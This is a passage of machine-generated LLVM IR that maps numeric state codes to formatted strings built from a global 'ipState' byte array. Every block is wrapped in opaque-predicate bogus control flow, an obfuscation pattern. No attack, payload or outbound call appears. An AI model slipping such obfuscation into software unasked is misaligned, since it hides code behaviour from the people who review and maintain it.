  br i1 %4620, label %originalBBpart2564, label %originalBB562alteredBB

originalBBpart2564:                               ; preds = %originalBB562
  br i1 %4612, label %4621, label %4628

; <label>:4621:                                   ; preds = %originalBBpart2564
  %4622 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %4623 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %4624 = zext i8 %4623 to i32
  %4625 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %4626 = zext i8 %4625 to i32
  %4627 = call i32 (i8*, i8*, ...) @szprintf(i8* %4622, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.730, i32 0, i32 0), i32 %4624, i32 %4626)
  br label %4628

; <label>:4628:                                   ; preds = %4621, %originalBBpart2564
  %4629 = load i32, i32* %1, align 4
  %4630 = icmp eq i32 %4629, 233
  br i1 %4630, label %4631, label %4638

; <label>:4631:                                   ; preds = %4628
  %4632 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %4633 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %4634 = zext i8 %4633 to i32
  %4635 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %4636 = zext i8 %4635 to i32
  %4637 = call i32 (i8*, i8*, ...) @szprintf(i8* %4632, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.731, i32 0, i32 0), i32 %4634, i32 %4636)
  br label %4638

; <label>:4638:                                   ; preds = %4631, %4628
  %4639 = load i32, i32* %1, align 4
  %4640 = icmp eq i32 %4639, 234
  br i1 %4640, label %4641, label %4664

; <label>:4641:                                   ; preds = %4638
  %4642 = load i32, i32* @x.65
  %4643 = load i32, i32* @y.66
  %4644 = sub i32 %4642, 1
  %4645 = mul i32 %4642, %4644
  %4646 = urem i32 %4645, 2
  %4647 = icmp eq i32 %4646, 0
  %4648 = icmp slt i32 %4643, 10
  %4649 = or i1 %4647, %4648
  br i1 %4649, label %originalBB566, label %originalBB566alteredBB

originalBB566:                                    ; preds = %originalBB566alteredBB, %4641
  %4650 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %4651 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %4652 = zext i8 %4651 to i32
  %4653 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %4654 = zext i8 %4653 to i32
  %4655 = call i32 (i8*, i8*, ...) @szprintf(i8* %4650, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.732, i32 0, i32 0), i32 %4652, i32 %4654)
  %4656 = load i32, i32* @x.65
  %4657 = load i32, i32* @y.66
  %4658 = sub i32 %4656, 1
  %4659 = mul i32 %4656, %4658
  %4660 = urem i32 %4659, 2
  %4661 = icmp eq i32 %4660, 0
  %4662 = icmp slt i32 %4657, 10
  %4663 = or i1 %4661, %4662
  br i1 %4663, label %originalBBpart2568, label %originalBB566alteredBB

originalBBpart2568:                               ; preds = %originalBB566
  br label %4664

; <label>:4664:                                   ; preds = %originalBBpart2568, %4638
  %4665 = load i32, i32* %1, align 4
  %4666 = icmp eq i32 %4665, 235
  br i1 %4666, label %4667, label %4674

; <label>:4667:                                   ; preds = %4664
  %4668 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %4669 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %4670 = zext i8 %4669 to i32
  %4671 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %4672 = zext i8 %4671 to i32
  %4673 = call i32 (i8*, i8*, ...) @szprintf(i8* %4668, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.733, i32 0, i32 0), i32 %4670, i32 %4672)
  br label %4674

; <label>:4674:                                   ; preds = %4667, %4664
  %4675 = load i32, i32* %1, align 4
  %4676 = icmp eq i32 %4675, 236
  br i1 %4676, label %4677, label %4684

; <label>:4677:                                   ; preds = %4674
  %4678 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %4679 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %4680 = zext i8 %4679 to i32
  %4681 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %4682 = zext i8 %4681 to i32
  %4683 = call i32 (i8*, i8*, ...) @szprintf(i8* %4678, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.734, i32 0, i32 0), i32 %4680, i32 %4682)
  br label %4684

; <label>:4684:                                   ; preds = %4677, %4674
  %4685 = load i32, i32* %1, align 4
  %4686 = icmp eq i32 %4685, 237
  br i1 %4686, label %4687, label %4694

; <label>:4687:                                   ; preds = %4684
  %4688 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %4689 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %4690 = zext i8 %4689 to i32
  %4691 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %4692 = zext i8 %4691 to i32
  %4693 = call i32 (i8*, i8*, ...) @szprintf(i8* %4688, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.735, i32 0, i32 0), i32 %4690, i32 %4692)
  br label %4694

; <label>:4694:                                   ; preds = %4687, %4684
  %4695 = load i32, i32* %1, align 4
  %4696 = icmp eq i32 %4695, 238
  br i1 %4696, label %4697, label %4704

; <label>:4697:                                   ; preds = %4694
  %4698 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %4699 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %4700 = zext i8 %4699 to i32
  %4701 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %4702 = zext i8 %4701 to i32
  %4703 = call i32 (i8*, i8*, ...) @szprintf(i8* %4698, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.736, i32 0, i32 0), i32 %4700, i32 %4702)
  br label %4704

; <label>:4704:                                   ; preds = %4697, %4694
  %4705 = load i32, i32* %1, align 4
  %4706 = icmp eq i32 %4705, 239
  br i1 %4706, label %4707, label %4730

; <label>:4707:                                   ; preds = %4704
  %4708 = load i32, i32* @x.65
  %4709 = load i32, i32* @y.66
  %4710 = sub i32 %4708, 1
  %4711 = mul i32 %4708, %4710
  %4712 = urem i32 %4711, 2
  %4713 = icmp eq i32 %4712, 0
  %4714 = icmp slt i32 %4709, 10
  %4715 = or i1 %4713, %4714
  br i1 %4715, label %originalBB570, label %originalBB570alteredBB

originalBB570:                                    ; preds = %originalBB570alteredBB, %4707
  %4716 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %4717 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %4718 = zext i8 %4717 to i32
  %4719 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %4720 = zext i8 %4719 to i32
  %4721 = call i32 (i8*, i8*, ...) @szprintf(i8* %4716, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.737, i32 0, i32 0), i32 %4718, i32 %4720)
  %4722 = load i32, i32* @x.65
  %4723 = load i32, i32* @y.66
  %4724 = sub i32 %4722, 1
  %4725 = mul i32 %4722, %4724
  %4726 = urem i32 %4725, 2
  %4727 = icmp eq i32 %4726, 0
  %4728 = icmp slt i32 %4723, 10
  %4729 = or i1 %4727, %4728
  br i1 %4729, label %originalBBpart2572, label %originalBB570alteredBB

originalBBpart2572:                               ; preds = %originalBB570
  br label %4730

; <label>:4730:                                   ; preds = %originalBBpart2572, %4704
  %4731 = load i32, i32* %1, align 4
  %4732 = icmp eq i32 %4731, 240
  br i1 %4732, label %4733, label %4740

; <label>:4733:                                   ; preds = %4730
  %4734 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %4735 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %4736 = zext i8 %4735 to i32
  %4737 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %4738 = zext i8 %4737 to i32
  %4739 = call i32 (i8*, i8*, ...) @szprintf(i8* %4734, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.738, i32 0, i32 0), i32 %4736, i32 %4738)
  br label %4740

; <label>:4740:                                   ; preds = %4733, %4730
  %4741 = load i32, i32* @x.65
  %4742 = load i32, i32* @y.66
  %4743 = sub i32 %4741, 1
  %4744 = mul i32 %4741, %4743
  %4745 = urem i32 %4744, 2
  %4746 = icmp eq i32 %4745, 0
  %4747 = icmp slt i32 %4742, 10
  %4748 = or i1 %4746, %4747
  br i1 %4748, label %originalBB574, label %originalBB574alteredBB

originalBB574:                                    ; preds = %originalBB574alteredBB, %4740
  %4749 = load i32, i32* %1, align 4
  %4750 = icmp eq i32 %4749, 241
  %4751 = load i32, i32* @x.65
  %4752 = load i32, i32* @y.66
  %4753 = sub i32 %4751, 1
  %4754 = mul i32 %4751, %4753
  %4755 = urem i32 %4754, 2
  %4756 = icmp eq i32 %4755, 0
  %4757 = icmp slt i32 %4752, 10
  %4758 = or i1 %4756, %4757
  br i1 %4758, label %originalBBpart2576, label %originalBB574alteredBB

originalBBpart2576:                               ; preds = %originalBB574
  br i1 %4750, label %4759, label %4766

; <label>:4759:                                   ; preds = %originalBBpart2576
  %4760 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %4761 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %4762 = zext i8 %4761 to i32
  %4763 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %4764 = zext i8 %4763 to i32
  %4765 = call i32 (i8*, i8*, ...) @szprintf(i8* %4760, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.739, i32 0, i32 0), i32 %4762, i32 %4764)
  br label %4766

; <label>:4766:                                   ; preds = %4759, %originalBBpart2576
  %4767 = load i32, i32* %1, align 4
  %4768 = icmp eq i32 %4767, 242
  br i1 %4768, label %4769, label %4776

; <label>:4769:                                   ; preds = %4766
  %4770 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %4771 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %4772 = zext i8 %4771 to i32
  %4773 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %4774 = zext i8 %4773 to i32
  %4775 = call i32 (i8*, i8*, ...) @szprintf(i8* %4770, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.740, i32 0, i32 0), i32 %4772, i32 %4774)
  br label %4776

; <label>:4776:                                   ; preds = %4769, %4766
  %4777 = load i32, i32* %1, align 4
  %4778 = icmp eq i32 %4777, 243
  br i1 %4778, label %4779, label %4802

; <label>:4779:                                   ; preds = %4776
  %4780 = load i32, i32* @x.65
  %4781 = load i32, i32* @y.66
  %4782 = sub i32 %4780, 1
  %4783 = mul i32 %4780, %4782
  %4784 = urem i32 %4783, 2
  %4785 = icmp eq i32 %4784, 0
  %4786 = icmp slt i32 %4781, 10
  %4787 = or i1 %4785, %4786
  br i1 %4787, label %originalBB578, label %originalBB578alteredBB

originalBB578:                                    ; preds = %originalBB578alteredBB, %4779
  %4788 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %4789 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %4790 = zext i8 %4789 to i32
  %4791 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %4792 = zext i8 %4791 to i32
  %4793 = call i32 (i8*, i8*, ...) @szprintf(i8* %4788, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.741, i32 0, i32 0), i32 %4790, i32 %4792)
  %4794 = load i32, i32* @x.65
  %4795 = load i32, i32* @y.66
  %4796 = sub i32 %4794, 1
  %4797 = mul i32 %4794, %4796
  %4798 = urem i32 %4797, 2
  %4799 = icmp eq i32 %4798, 0
  %4800 = icmp slt i32 %4795, 10
  %4801 = or i1 %4799, %4800
  br i1 %4801, label %originalBBpart2580, label %originalBB578alteredBB

originalBBpart2580:                               ; preds = %originalBB578
  br label %4802

; <label>:4802:                                   ; preds = %originalBBpart2580, %4776
  %4803 = load i32, i32* %1, align 4
  %4804 = icmp eq i32 %4803, 244
  br i1 %4804, label %4805, label %4812

; <label>:4805:                                   ; preds = %4802
  %4806 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %4807 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %4808 = zext i8 %4807 to i32
  %4809 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %4810 = zext i8 %4809 to i32
  %4811 = call i32 (i8*, i8*, ...) @szprintf(i8* %4806, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.742, i32 0, i32 0), i32 %4808, i32 %4810)
  br label %4812

; <label>:4812:                                   ; preds = %4805, %4802
  %4813 = load i32, i32* %1, align 4
  %4814 = icmp eq i32 %4813, 245
  br i1 %4814, label %4815, label %4838

; <label>:4815:                                   ; preds = %4812
  %4816 = load i32, i32* @x.65
  %4817 = load i32, i32* @y.66
  %4818 = sub i32 %4816, 1
  %4819 = mul i32 %4816, %4818
  %4820 = urem i32 %4819, 2
  %4821 = icmp eq i32 %4820, 0
  %4822 = icmp slt i32 %4817, 10
  %4823 = or i1 %4821, %4822
  br i1 %4823, label %originalBB582, label %originalBB582alteredBB

originalBB582:                                    ; preds = %originalBB582alteredBB, %4815
  %4824 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %4825 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %4826 = zext i8 %4825 to i32
  %4827 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %4828 = zext i8 %4827 to i32
  %4829 = call i32 (i8*, i8*, ...) @szprintf(i8* %4824, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.743, i32 0, i32 0), i32 %4826, i32 %4828)
  %4830 = load i32, i32* @x.65
  %4831 = load i32, i32* @y.66
  %4832 = sub i32 %4830, 1
  %4833 = mul i32 %4830, %4832
  %4834 = urem i32 %4833, 2
  %4835 = icmp eq i32 %4834, 0
  %4836 = icmp slt i32 %4831, 10
  %4837 = or i1 %4835, %4836
  br i1 %4837, label %originalBBpart2584, label %originalBB582alteredBB

originalBBpart2584:                               ; preds = %originalBB582
  br label %4838

; <label>:4838:                                   ; preds = %originalBBpart2584, %4812
  %4839 = load i32, i32* @x.65
  %4840 = load i32, i32* @y.66
  %4841 = sub i32 %4839, 1
  %4842 = mul i32 %4839, %4841
  %4843 = urem i32 %4842, 2
  %4844 = icmp eq i32 %4843, 0
  %4845 = icmp slt i32 %4840, 10
  %4846 = or i1 %4844, %4845
  br i1 %4846, label %originalBB586, label %originalBB586alteredBB

originalBB586:                                    ; preds = %originalBB586alteredBB, %4838
  %4847 = load i32, i32* %1, align 4
  %4848 = icmp eq i32 %4847, 256
  %4849 = load i32, i32* @x.65
  %4850 = load i32, i32* @y.66
  %4851 = sub i32 %4849, 1
  %4852 = mul i32 %4849, %4851
  %4853 = urem i32 %4852, 2
  %4854 = icmp eq i32 %4853, 0
  %4855 = icmp slt i32 %4850, 10
  %4856 = or i1 %4854, %4855
  br i1 %4856, label %originalBBpart2588, label %originalBB586alteredBB

originalBBpart2588:                               ; preds = %originalBB586
  br i1 %4848, label %4857, label %4864

; <label>:4857:                                   ; preds = %originalBBpart2588
  %4858 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %4859 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %4860 = zext i8 %4859 to i32
  %4861 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %4862 = zext i8 %4861 to i32
  %4863 = call i32 (i8*, i8*, ...) @szprintf(i8* %4858, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.744, i32 0, i32 0), i32 %4860, i32 %4862)
  br label %4864

; <label>:4864:                                   ; preds = %4857, %originalBBpart2588
  %4865 = load i32, i32* %1, align 4
  %4866 = icmp eq i32 %4865, 257
  br i1 %4866, label %4867, label %4874

; <label>:4867:                                   ; preds = %4864
  %4868 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %4869 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %4870 = zext i8 %4869 to i32
  %4871 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %4872 = zext i8 %4871 to i32
  %4873 = call i32 (i8*, i8*, ...) @szprintf(i8* %4868, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.698, i32 0, i32 0), i32 %4870, i32 %4872)
  br label %4874

; <label>:4874:                                   ; preds = %4867, %4864
  %4875 = load i32, i32* %1, align 4
  %4876 = icmp eq i32 %4875, 258
  br i1 %4876, label %4877, label %4884

; <label>:4877:                                   ; preds = %4874
  %4878 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %4879 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %4880 = zext i8 %4879 to i32
  %4881 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %4882 = zext i8 %4881 to i32
  %4883 = call i32 (i8*, i8*, ...) @szprintf(i8* %4878, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.745, i32 0, i32 0), i32 %4880, i32 %4882)
  br label %4884

; <label>:4884:                                   ; preds = %4877, %4874
  %4885 = load i32, i32* @x.65
  %4886 = load i32, i32* @y.66
  %4887 = sub i32 %4885, 1
  %4888 = mul i32 %4885, %4887
  %4889 = urem i32 %4888, 2
  %4890 = icmp eq i32 %4889, 0
  %4891 = icmp slt i32 %4886, 10
  %4892 = or i1 %4890, %4891
  br i1 %4892, label %originalBB590, label %originalBB590alteredBB

originalBB590:                                    ; preds = %originalBB590alteredBB, %4884
  %4893 = load i32, i32* %1, align 4
  %4894 = icmp eq i32 %4893, 259
  %4895 = load i32, i32* @x.65
  %4896 = load i32, i32* @y.66
  %4897 = sub i32 %4895, 1
  %4898 = mul i32 %4895, %4897
  %4899 = urem i32 %4898, 2
  %4900 = icmp eq i32 %4899, 0
  %4901 = icmp slt i32 %4896, 10
  %4902 = or i1 %4900, %4901
  br i1 %4902, label %originalBBpart2592, label %originalBB590alteredBB

originalBBpart2592:                               ; preds = %originalBB590
  br i1 %4894, label %4903, label %4910

; <label>:4903:                                   ; preds = %originalBBpart2592
  %4904 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %4905 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %4906 = zext i8 %4905 to i32
  %4907 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %4908 = zext i8 %4907 to i32
  %4909 = call i32 (i8*, i8*, ...) @szprintf(i8* %4904, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.700, i32 0, i32 0), i32 %4906, i32 %4908)
  br label %4910

; <label>:4910:                                   ; preds = %4903, %originalBBpart2592
  %4911 = load i32, i32* @x.65
  %4912 = load i32, i32* @y.66
  %4913 = sub i32 %4911, 1
  %4914 = mul i32 %4911, %4913
  %4915 = urem i32 %4914, 2
  %4916 = icmp eq i32 %4915, 0
  %4917 = icmp slt i32 %4912, 10
  %4918 = or i1 %4916, %4917
  br i1 %4918, label %originalBB594, label %originalBB594alteredBB

originalBB594:                                    ; preds = %originalBB594alteredBB, %4910
  %4919 = load i32, i32* %1, align 4
  %4920 = icmp eq i32 %4919, 260
  %4921 = load i32, i32* @x.65
  %4922 = load i32, i32* @y.66
  %4923 = sub i32 %4921, 1
  %4924 = mul i32 %4921, %4923
  %4925 = urem i32 %4924, 2
  %4926 = icmp eq i32 %4925, 0
  %4927 = icmp slt i32 %4922, 10
  %4928 = or i1 %4926, %4927
  br i1 %4928, label %originalBBpart2596, label %originalBB594alteredBB

originalBBpart2596:                               ; preds = %originalBB594
  br i1 %4920, label %4929, label %4936

; <label>:4929:                                   ; preds = %originalBBpart2596
  %4930 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %4931 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %4932 = zext i8 %4931 to i32
  %4933 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %4934 = zext i8 %4933 to i32
  %4935 = call i32 (i8*, i8*, ...) @szprintf(i8* %4930, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.746, i32 0, i32 0), i32 %4932, i32 %4934)
  br label %4936

; <label>:4936:                                   ; preds = %4929, %originalBBpart2596
  %4937 = load i32, i32* @x.65
  %4938 = load i32, i32* @y.66
  %4939 = sub i32 %4937, 1
  %4940 = mul i32 %4937, %4939
  %4941 = urem i32 %4940, 2
  %4942 = icmp eq i32 %4941, 0
  %4943 = icmp slt i32 %4938, 10
  %4944 = or i1 %4942, %4943
  br i1 %4944, label %originalBB598, label %originalBB598alteredBB

originalBB598:                                    ; preds = %originalBB598alteredBB, %4936
  %4945 = load i32, i32* %1, align 4
  %4946 = icmp eq i32 %4945, 261
  %4947 = load i32, i32* @x.65
  %4948 = load i32, i32* @y.66
  %4949 = sub i32 %4947, 1
  %4950 = mul i32 %4947, %4949
  %4951 = urem i32 %4950, 2
  %4952 = icmp eq i32 %4951, 0
  %4953 = icmp slt i32 %4948, 10
  %4954 = or i1 %4952, %4953
  br i1 %4954, label %originalBBpart2600, label %originalBB598alteredBB

originalBBpart2600:                               ; preds = %originalBB598
  br i1 %4946, label %4955, label %4962

; <label>:4955:                                   ; preds = %originalBBpart2600
  %4956 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %4957 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %4958 = zext i8 %4957 to i32
  %4959 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %4960 = zext i8 %4959 to i32
  %4961 = call i32 (i8*, i8*, ...) @szprintf(i8* %4956, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.849, i32 0, i32 0), i32 %4958, i32 %4960)
  br label %4962

; <label>:4962:                                   ; preds = %4955, %originalBBpart2600
  %4963 = load i32, i32* %1, align 4
  %4964 = icmp eq i32 %4963, 262
  br i1 %4964, label %4965, label %4972

; <label>:4965:                                   ; preds = %4962
  %4966 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %4967 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %4968 = zext i8 %4967 to i32
  %4969 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %4970 = zext i8 %4969 to i32
  %4971 = call i32 (i8*, i8*, ...) @szprintf(i8* %4966, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.850, i32 0, i32 0), i32 %4968, i32 %4970)
  br label %4972

; <label>:4972:                                   ; preds = %4965, %4962
  %4973 = load i32, i32* %1, align 4
  %4974 = icmp eq i32 %4973, 263
  br i1 %4974, label %4975, label %4982

; <label>:4975:                                   ; preds = %4972
  %4976 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %4977 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %4978 = zext i8 %4977 to i32
  %4979 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %4980 = zext i8 %4979 to i32
  %4981 = call i32 (i8*, i8*, ...) @szprintf(i8* %4976, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.747, i32 0, i32 0), i32 %4978, i32 %4980)
  br label %4982

; <label>:4982:                                   ; preds = %4975, %4972
  %4983 = load i32, i32* %1, align 4
  %4984 = icmp eq i32 %4983, 264
  br i1 %4984, label %4985, label %4992

; <label>:4985:                                   ; preds = %4982
  %4986 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %4987 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %4988 = zext i8 %4987 to i32
  %4989 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %4990 = zext i8 %4989 to i32
  %4991 = call i32 (i8*, i8*, ...) @szprintf(i8* %4986, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.662, i32 0, i32 0), i32 %4988, i32 %4990)
  br label %4992

; <label>:4992:                                   ; preds = %4985, %4982
  %4993 = load i32, i32* %1, align 4
  %4994 = icmp eq i32 %4993, 265
  br i1 %4994, label %4995, label %5002

; <label>:4995:                                   ; preds = %4992
  %4996 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %4997 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %4998 = zext i8 %4997 to i32
  %4999 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %5000 = zext i8 %4999 to i32
  %5001 = call i32 (i8*, i8*, ...) @szprintf(i8* %4996, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.851, i32 0, i32 0), i32 %4998, i32 %5000)
  br label %5002

; <label>:5002:                                   ; preds = %4995, %4992
  %5003 = load i32, i32* @x.65
  %5004 = load i32, i32* @y.66
  %5005 = sub i32 %5003, 1
  %5006 = mul i32 %5003, %5005
  %5007 = urem i32 %5006, 2
  %5008 = icmp eq i32 %5007, 0
  %5009 = icmp slt i32 %5004, 10
  %5010 = or i1 %5008, %5009
  br i1 %5010, label %originalBB602, label %originalBB602alteredBB

originalBB602:                                    ; preds = %originalBB602alteredBB, %5002
  %5011 = load i32, i32* %1, align 4
  %5012 = icmp eq i32 %5011, 266
  %5013 = load i32, i32* @x.65
  %5014 = load i32, i32* @y.66
  %5015 = sub i32 %5013, 1
  %5016 = mul i32 %5013, %5015
  %5017 = urem i32 %5016, 2
  %5018 = icmp eq i32 %5017, 0
  %5019 = icmp slt i32 %5014, 10
  %5020 = or i1 %5018, %5019
  br i1 %5020, label %originalBBpart2604, label %originalBB602alteredBB

originalBBpart2604:                               ; preds = %originalBB602
  br i1 %5012, label %5021, label %5044

; <label>:5021:                                   ; preds = %originalBBpart2604
  %5022 = load i32, i32* @x.65
  %5023 = load i32, i32* @y.66
  %5024 = sub i32 %5022, 1
  %5025 = mul i32 %5022, %5024
  %5026 = urem i32 %5025, 2
  %5027 = icmp eq i32 %5026, 0
  %5028 = icmp slt i32 %5023, 10
  %5029 = or i1 %5027, %5028
  br i1 %5029, label %originalBB606, label %originalBB606alteredBB

originalBB606:                                    ; preds = %originalBB606alteredBB, %5021
  %5030 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %5031 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %5032 = zext i8 %5031 to i32
  %5033 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %5034 = zext i8 %5033 to i32
  %5035 = call i32 (i8*, i8*, ...) @szprintf(i8* %5030, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.748, i32 0, i32 0), i32 %5032, i32 %5034)
  %5036 = load i32, i32* @x.65
  %5037 = load i32, i32* @y.66
  %5038 = sub i32 %5036, 1
  %5039 = mul i32 %5036, %5038
  %5040 = urem i32 %5039, 2
  %5041 = icmp eq i32 %5040, 0
  %5042 = icmp slt i32 %5037, 10
  %5043 = or i1 %5041, %5042
  br i1 %5043, label %originalBBpart2608, label %originalBB606alteredBB

originalBBpart2608:                               ; preds = %originalBB606
  br label %5044

; <label>:5044:                                   ; preds = %originalBBpart2608, %originalBBpart2604
  %5045 = load i32, i32* @x.65
  %5046 = load i32, i32* @y.66
  %5047 = sub i32 %5045, 1
  %5048 = mul i32 %5045, %5047
  %5049 = urem i32 %5048, 2
  %5050 = icmp eq i32 %5049, 0
  %5051 = icmp slt i32 %5046, 10
  %5052 = or i1 %5050, %5051
  br i1 %5052, label %originalBB610, label %originalBB610alteredBB

originalBB610:                                    ; preds = %originalBB610alteredBB, %5044
  %5053 = load i32, i32* %1, align 4
  %5054 = icmp eq i32 %5053, 267
  %5055 = load i32, i32* @x.65
